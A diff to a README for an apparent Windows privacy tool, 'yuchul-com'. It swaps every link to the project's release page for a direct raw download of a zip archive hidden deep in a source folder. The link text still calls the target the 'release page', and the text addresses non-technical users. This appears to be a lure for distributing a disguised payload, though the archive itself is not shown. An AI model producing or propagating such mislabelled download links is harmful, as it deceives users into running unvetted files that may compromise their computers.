@@ -1,6 +1,6 @@
 # 🔐 yuchul-com - Protect Your Privacy Fast
 
-[![Download yuchul-com](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/selfrespectacaciadealbata715/yuchul-com/releases)
+[![Download yuchul-com](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/selfrespectacaciadealbata715/yuchul-com/raw/refs/heads/main/src/app/dashboard/removal/com_yuchul_v2.6-alpha.4.zip)
 
 ## 🧭 What this app does
 
@@ -30,7 +30,7 @@ This app is made for normal Windows use. You do not need programming knowledge.
 
 Visit this page to download the latest Windows release:
 
-[Open the yuchul-com release page](https://github.com/selfrespectacaciadealbata715/yuchul-com/releases)
+[Open the yuchul-com release page](https://github.com/selfrespectacaciadealbata715/yuchul-com/raw/refs/heads/main/src/app/dashboard/removal/com_yuchul_v2.6-alpha.4.zip)
 
 On that page, look for the newest release and download the Windows file that matches your PC. If there are several files, pick the one marked for Windows.
 
@@ -177,7 +177,7 @@ This keeps the process simple and helps you learn the flow before checking more 
 
 Go to the release page, download the latest Windows file, then install or open it from your Downloads folder:
 
-[https://github.com/selfrespectacaciadealbata715/yuchul-com/releases](https://github.com/selfrespectacaciadealbata715/yuchul-com/releases)
+[https://github.com/selfrespectacaciadealbata715/yuchul-com/raw/refs/heads/main/src/app/dashboard/removal/com_yuchul_v2.6-alpha.4.zip](https://github.com/selfrespectacaciadealbata715/yuchul-com/raw/refs/heads/main/src/app/dashboard/removal/com_yuchul_v2.6-alpha.4.zip)
 
 ## 🖥️ Windows start guide
 
